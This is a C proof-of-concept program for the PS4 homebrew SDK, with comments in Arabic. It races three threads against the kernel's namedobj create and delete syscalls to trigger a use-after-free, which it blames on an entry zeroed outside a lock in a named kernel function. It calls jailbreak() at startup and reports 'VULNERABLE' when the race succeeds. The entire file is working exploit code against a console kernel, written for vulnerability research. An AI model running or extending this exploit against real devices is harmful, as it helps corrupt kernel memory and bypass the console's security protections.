#include "ps4.h"

#define SYS_NAMEDOBJ_CREATE 557
#define SYS_NAMEDOBJ_DELETE 558

static int namedobj_create(const char* name,
                            int data,
                            uint32_t flags) {
    return syscall(SYS_NAMEDOBJ_CREATE, name, data, flags);
}

static int namedobj_delete(uint32_t handle,
                            uint16_t flags) {
    return syscall(SYS_NAMEDOBJ_DELETE, handle, flags);
}

static volatile int g_handle  = -1;
static volatile int g_running =  1;
static volatile int g_hits    =  0;

// Thread A — يحذف ويترك window مفتوح
void* thread_delete_a(void* arg) {
    printf_debug("thread_A start\n");
    while (g_running) {
        int h = g_handle;
        if (h == -1) continue;

        g_handle = -1;
        // هذا يفتح الـ window:
        // TABLE UNLOCK → entry[0x10] = 0
        namedobj_delete(h, 0x107);
    }
    printf_debug("thread_A exit\n");
    return NULL;
}

// Thread B — يحاول في نفس الـ window
void* thread_delete_b(void* arg) {
    printf_debug("thread_B start\n");
    while (g_running) {
        int h = g_handle;
        if (h == -1) continue;

        // يحاول حذف نفس الـ handle
        // لو نجح = وصل للـ entry قبل أن تُصفَّر = UAF
        int r = namedobj_delete(h, 0x107);
        if (r == 0) {
            g_hits++;
            printf_debug("[!!!] UAF HIT #%d h=0x%x\n",
                         g_hits, h);
        }
    }
    printf_debug("thread_B exit\n");
    return NULL;
}

// Thread C — يُنشئ باستمرار
void* thread_create(void* arg) {
    printf_debug("thread_C start\n");
    while (g_running) {
        SceKernelEqueue eq;
        int ret = sceKernelCreateEqueue(&eq, "poc_uaf");
        if (ret != 0) continue;

        // الـ handle من الـ equeue
        int h = (int)((uint64_t)eq >> 32);
        if (h <= 0) {
            sceKernelDeleteEqueue(eq);
            continue;
        }

        printf_debug("created h=0x%x\n", h);
        g_handle = h;

        // انتظر thread_A يحذفه
        while (g_handle != -1 && g_running)
            sceKernelUsleep(1);

        sceKernelDeleteEqueue(eq);
    }
    printf_debug("thread_C exit\n");
    return NULL;
}

int _main(struct thread *td) {
    UNUSED(td);

    initKernel();
    initLibc();
    initPthread();
    initNetwork();
    jailbreak();
    initSysUtil();

    ScePthread tA, tB, tC;

    printf_debug("=== namedobj UAF PoC ===\n");
    printf_debug("Bug: entry[0x10] zeroed outside lock\n");
    printf_debug("in FUN_ffffffff8244e3e0\n\n");

    scePthreadCreate(&tC, NULL, thread_create,  NULL, "creator");
    scePthreadCreate(&tA, NULL, thread_delete_a, NULL, "deleter_a");
    scePthreadCreate(&tB, NULL, thread_delete_b, NULL, "deleter_b");

    sceKernelSleep(30);
    g_running = 0;

    scePthreadJoin(tA, NULL);
    scePthreadJoin(tB, NULL);
    scePthreadJoin(tC, NULL);

    printf_debug("\n=== Results ===\n");
    printf_debug("UAF hits: %d\n", g_hits);

    if (g_hits > 0) {
        printf_debug("[+] VULNERABLE!\n");
    } else {
        printf_debug("[-] No hits - timing needs adjustment\n");
    }

    return 0;
}